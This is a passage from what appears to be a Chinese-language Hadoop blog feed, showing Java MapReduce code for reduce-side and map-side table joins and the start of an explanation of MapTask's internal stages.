fileSplit.getPath().getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(LongWritable key, Text value, Mapper&lt;LongWritable, Text, Text, TableBean&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 获取一行</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> value.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断是哪个文件，然后针对文件进行不同的操作</span></span><br><span class="line">        String[] split = line.split(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (filename.contains(<span class="string">&quot;order&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 订单表的处理</span></span><br><span class="line">            <span class="comment">// 封装 outK</span></span><br><span class="line">            outK.set(split[<span class="number">1</span>]); <span class="comment">//两表相同的字段 用于进入同一个reduce     pid</span></span><br><span class="line">            <span class="comment">// 封装 outV</span></span><br><span class="line">            outV.setId(split[<span class="number">0</span>]);</span><br><span class="line">            outV.setPid(split[<span class="number">1</span>]);</span><br><span class="line">            outV.setAmount(Integer.parseInt(split[<span class="number">2</span>])); <span class="comment">// int 类型</span></span><br><span class="line">            outV.setPName(<span class="string">&quot; &quot;</span>);  <span class="comment">// 该表中未含有这个字段，设置为空</span></span><br><span class="line">            outV.setFlag(<span class="string">&quot;order&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 商品表的处理</span></span><br><span class="line">            <span class="comment">// 封装 outK</span></span><br><span class="line">            outK.set(split[<span class="number">0</span>]);</span><br><span class="line">            <span class="comment">// 封装 outV</span></span><br><span class="line">            outV.setId(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            outV.setPid(split[<span class="number">0</span>]);</span><br><span class="line">            outV.setAmount(<span class="number">0</span>); <span class="comment">// int 类型</span></span><br><span class="line">            outV.setPName(split[<span class="number">1</span>]);  <span class="comment">// 该表中未含有这个字段，设置为空</span></span><br><span class="line">            outV.setFlag(<span class="string">&quot;pd&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 写出 KV</span></span><br><span class="line">        context.write(outK, outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）编写-TableReducer-类"><a href="#（3）编写-TableReducer-类" class="headerlink" title="（3）编写 TableReducer 类"></a>（3）编写 TableReducer 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.reduceJoin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.NullWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 17:59 2023/2/2</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TableReducer</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, TableBean, TableBean, NullWritable&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;TableBean&gt; values, Reducer&lt;Text, TableBean, TableBean, NullWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;TableBean&gt; orderBeans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TableBean</span> <span class="variable">pdBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TableBean</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (TableBean value : values) &#123;</span><br><span class="line">            <span class="comment">// 判断数据来自哪个表</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;order&quot;</span>.equals(value.getFlag())) &#123;</span><br><span class="line">                <span class="comment">// 订单表</span></span><br><span class="line">                <span class="comment">// 创建一个临时TableBean对象接收value,不可以直接进行赋值，hadoop内部进行了优化 传递过来的对象仅有地址，因此直接赋值 只会保留最后一个对象的信息</span></span><br><span class="line">                <span class="type">TableBean</span> <span class="variable">tmpOrderBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TableBean</span>();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    BeanUtils.copyProperties(tmpOrderBean, value);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException | IllegalAccessException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 将临时创建的对象 添加进入集合中</span></span><br><span class="line">                orderBeans.add(tmpOrderBean);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    BeanUtils.copyProperties(pdBean,value);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException | IllegalAccessException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历集合 orderBeans,替换掉每个 orderBean 的 pid 为 pName,然后写出</span></span><br><span class="line">        <span class="keyword">for</span> (TableBean orderBean : orderBeans) &#123;</span><br><span class="line">            <span class="comment">// 同pid 进同一个reduce 故而pName 唯一</span></span><br><span class="line">            orderBean.setPName(pdBean.getPName());</span><br><span class="line">            <span class="comment">// 写出修改后的对象</span></span><br><span class="line">            context.write(orderBean,NullWritable.get());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（4）编写-TableDriver-类"><a href="#（4）编写-TableDriver-类" class="headerlink" title="（4）编写 TableDriver 类"></a>（4）编写 TableDriver 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.reduceJoin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.NullWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 18:16 2023/2/2</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TableDriver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance(<span class="keyword">new</span> <span class="title class_">Configuration</span>());</span><br><span class="line"></span><br><span class="line">        job.setJarByClass(TableDriver.class);</span><br><span class="line">        job.setMapperClass(TableMapper.class);</span><br><span class="line">        job.setReducerClass(TableReducer.class);</span><br><span class="line"></span><br><span class="line">        job.setMapOutputKeyClass(Text.class);</span><br><span class="line">        job.setMapOutputValueClass(TableBean.class);</span><br><span class="line"></span><br><span class="line">        job.setOutputKeyClass(TableBean.class);</span><br><span class="line">        job.setOutputValueClass(NullWritable.class);</span><br><span class="line"></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\input\\&quot;</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\output5\\&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> job.waitForCompletion(<span class="literal">true</span>);</span><br><span class="line">        System.exit(b ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（5）运行结果"><a href="#（5）运行结果" class="headerlink" title="（5）运行结果"></a>（5）运行结果</h3><img src="/blog/bb94c1b7.html/image-20230203142810183.png" alt="image-20230203142810183" style="zoom: 67%;"><h3 id="（6）总结"><a href="#（6）总结" class="headerlink" title="（6）总结"></a>（6）总结</h3><p>​缺点：这种方式中，合并的操作是在 Reduce 阶段完成，Reduce 端的处理压力太大，Map 节点的运算负载则很低，资源利用率不高，且在 Reduce 阶段极易产生数据倾斜。</p><p>​解决方案：Map 端实现数据合并。</p><h1 id="三：Map-Join"><a href="#三：Map-Join" class="headerlink" title="三：Map Join"></a>三：Map Join</h1><h2 id="3-1-应用场景"><a href="#3-1-应用场景" class="headerlink" title="3.1 应用场景"></a>3.1 应用场景</h2><p>Map Join 适用于一张表十分小、一张表很大的场景。</p><h2 id="3-2-优点"><a href="#3-2-优点" class="headerlink" title="3.2 优点"></a>3.2 优点</h2><p>在 Reduce 端处理过多的表，非常容易产生数据倾斜；</p><p>在 Map 端缓存多张表，提前处理业务逻辑，这样增加 Map 端业务，减少 Reduce 端数 据的压力，尽可能的减少数据倾斜。</p><h2 id="3-3-实现手段——采用-DistributedCache"><a href="#3-3-实现手段——采用-DistributedCache" class="headerlink" title="3.3 实现手段——采用 DistributedCache"></a>3.3 实现手段——采用 DistributedCache</h2><p>（1）在 Mapper 的 setup 阶段，将文件读取到缓存集合中。</p><p>（2）在 Driver 驱动类中加载缓存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//缓存普通文件到 Task 运行节点。</span></span><br><span class="line">job.addCacheFile(<span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;file:///y:/Temp/input/pd.txt&quot;</span>));</span><br><span class="line"><span class="comment">//如果是集群运行,需要设置 HDFS 路径</span></span><br><span class="line">job.addCacheFile(<span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;hdfs://hadoop101:8020/tmp/cache/pd.txt&quot;</span>));</span><br></pre></td></tr></table></figure><h1 id="四：Map-Join-案例实操"><a href="#四：Map-Join-案例实操" class="headerlink" title="四：Map Join 案例实操"></a>四：Map Join 案例实操</h1><h2 id="4-1-需求"><a href="#4-1-需求" class="headerlink" title="4.1 需求"></a>4.1 需求</h2><p><img src="/blog/bb94c1b7.html/image-20230203143257142.png"></p><h2 id="4-2-需求分析"><a href="#4-2-需求分析" class="headerlink" title="4.2 需求分析"></a>4.2 需求分析</h2><p>MapJoin 适用于关联表中有小表的情形；</p><p><img src="/blog/bb94c1b7.html/image-20230203143357885.png"></p><h2 id="4-3-代码实现"><a href="#4-3-代码实现" class="headerlink" title="4.3 代码实现"></a>4.3 代码实现</h2><h3 id="（1）先在-MapJoinDriver-驱动类中添加缓存文件"><a href="#（1）先在-MapJoinDriver-驱动类中添加缓存文件" class="headerlink" title="（1）先在 MapJoinDriver 驱动类中添加缓存文件"></a>（1）先在 MapJoinDriver 驱动类中添加缓存文件</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.mapJoin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.NullWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 18:16 2023/2/2</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TableDriver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException, URISyntaxException &#123;</span><br><span class="line">        <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance(<span class="keyword">new</span> <span class="title class_">Configuration</span>());</span><br><span class="line"></span><br><span class="line">        job.setJarByClass(TableDriver.class);</span><br><span class="line">        job.setMapperClass(TableMapper.class);</span><br><span class="line"></span><br><span class="line">        job.setMapOutputKeyClass(Text.class);</span><br><span class="line">        job.setMapOutputValueClass(NullWritable.class);</span><br><span class="line"></span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(NullWritable.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Author: Rupert-Tears</span></span><br><span class="line"><span class="comment">         * CreateTime: 14:37 2023/2/3</span></span><br><span class="line"><span class="comment">         * Description: 加载缓存数据</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.addCacheFile(<span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;file:///Y:/Temp/pd.txt&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Map 端 Join 的逻辑不需要 Reduce 阶段，设置 reduceTask 数量为 0</span></span><br><span class="line">        job.setNumReduceTasks(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\input\\&quot;</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\output2\\&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> job.waitForCompletion(<span class="literal">true</span>);</span><br><span class="line">        System.exit(b ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）在-MapJoinMapper-类中的-setup-方法中读取缓存文件"><a href="#（2）在-MapJoinMapper-类中的-setup-方法中读取缓存文件" class="headerlink" title="（2）在 MapJoinMapper 类中的 setup 方法中读取缓存文件"></a>（2）在 MapJoinMapper 类中的 setup 方法中读取缓存文件</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.mapJoin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.FSDataInputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.FileSystem;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.LongWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.NullWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 17:38 2023/2/2</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TableMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;LongWritable, Text, Text, NullWritable&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String&gt; pdMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Text</span> <span class="variable">text</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Author: Rupert-Tears</span></span><br><span class="line"><span class="comment">     * CreateTime: 14:43 2023/2/3</span></span><br><span class="line"><span class="comment">     * Description: 任务开始前 先将pd数据缓存进入 pdMap</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setup</span><span class="params">(Mapper&lt;LongWritable, Text, Text, NullWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 通过缓存文件得到小表数据 pd.txt</span></span><br><span class="line">        <span class="keyword">final</span> URI[] cacheFiles = context.getCacheFiles();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Path</span>(cacheFiles[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">// 获取文件系统对象 并开启流</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">FileSystem</span> <span class="variable">fileSystem</span> <span class="operator">=</span> FileSystem.get(context.getConfiguration());</span><br><span class="line">        <span class="keyword">final</span> <span class="type">FSDataInputStream</span> <span class="variable">open</span> <span class="operator">=</span> fileSystem.open(path);</span><br><span class="line">        <span class="comment">// 通过包装流转换为reader,方便按行读取</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(open, StandardCharsets.UTF_8));</span><br><span class="line">        <span class="comment">// 逐行读取、按行处理</span></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> (StringUtils.isNotEmpty(line = reader.readLine())) &#123;</span><br><span class="line">            <span class="comment">// 切割一行     11 小米</span></span><br><span class="line">            <span class="keyword">final</span> String[] split = line.split(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            pdMap.put(split[<span class="number">0</span>], split[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关闭流</span></span><br><span class="line">        IOUtils.closeStream(reader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(LongWritable key, Text value, Mapper&lt;LongWritable, Text, Text, NullWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 读取大表数据</span></span><br><span class="line">        <span class="comment">// 1001 11 2</span></span><br><span class="line">        <span class="keyword">final</span> String[] split = value.toString().split(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过大表的每行数据的pid 去取出pdMap 中的pName</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">pName</span> <span class="operator">=</span> pdMap.get(split[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">// 将大表每行数据的pid替换为pName</span></span><br><span class="line">        text.set(split[<span class="number">0</span>] + <span class="string">&quot;\t&quot;</span> + pName + <span class="string">&quot;\t&quot;</span> + split[<span class="number">2</span>]);</span><br><span class="line">        <span class="comment">// 写出</span></span><br><span class="line">        context.write(text, NullWritable.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MapReduce 内核源码解析</title>
      <link href="/blog/77ff229c.html/"/>
      <url>/blog/77ff229c.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：MapTask-工作机制"><a href="#一：MapTask-工作机制" class="headerlink" title="一：MapTask 工作机制"></a>一：MapTask 工作机制</h1><p><img src="/blog/77ff229c.html/image-20221219121005329.png"></p><p>（1）Read 阶段：MapTask 通过 InputFormat 获得的 RecordReader，从输入 InputSplit 中 解析出一个个 key&#x2F;value。</p><p>（2）Map 阶段：该节点主要是将解析出的 key&#x2F;value 交给用户编写 map()函数处理，并 产生一系列新的 key&#x2F;value。</p><p>（3）Collect 收集阶段：在用户编写 map()函数中，当数据处理完成后，一般会调用 OutputCollector.collect()输出结果。在该函数内部，它会将生成的 key&#x2F;value 分区（调用 Partitioner），并写入一个环形内存缓冲区中。</p><p>（4）Spill 阶段：即“溢写”，当环形缓冲区满后，MapReduce 会将数据写到本地磁盘上， 生成一个临时文件。需要注意的是，将数据写入本地磁盘之前，先要对数据进行一次本地排序，并在必要时对数据进行合并、压缩等操作。</p><p><strong>溢写阶段详情：</strong></p><p>步骤 1：利用快速排序算法对缓存区内的数据进行排序，排序方式是，先按照分区编号 Partition 进行排序，然后按照 key 进行排序。这样，经过排序后，数据以分区为单位聚集在 一起，且同一分区内所有数据按照 key 有序。</p><p>步骤 2：按照分区编号由小到大依次将每个分区中的数据写入任务工作目录下的临时文 件 output&#x2F;spillN.out（N 表示当前溢写次数）中。如果用户设置了 Combiner，则写入文件之 前，对每个分区中的数据进行一次聚集操作。</p><p>步骤 3：将分区数据的元信息写到内存索引数据结构 SpillRecord 中，其中每个分区的元 信息包括在临时文件中的偏移量、压缩前数据大小和压缩后数据大小。如果当前内存索引大 小超过 1MB，则将内存索引写到文件 output&#x2F;spillN.out.index 中。</p><p>（5）Merge 阶段：当所有数据处理完成后，MapTask 对所有临时文件进行一次合并， 以确保最终只会生成一个数据文件。</p><p>当所有数据处理完后，MapTask 会将所有临时文件合并成一个大文件，并保存到文件 output&#x2F;file.out 中，同时生成相应的索引文件 output&#x2F;file.out.index。 </p><p>在进行文件合并过程中，MapTask 以分区为单位进行合并。对于某个分区，它将采用多 轮递归合并的方式。每轮合并 mapreduce.task.io.sort.factor（默认 10）个文件，并将产生的文 件重新加入待合并列表中，对文件排序后，重复以上过程，直到最终得到一个大文件。 </p><p>让每个 MapTask 最终只生成一个数据文件，可避免同时打开大量文件和同时读取大量 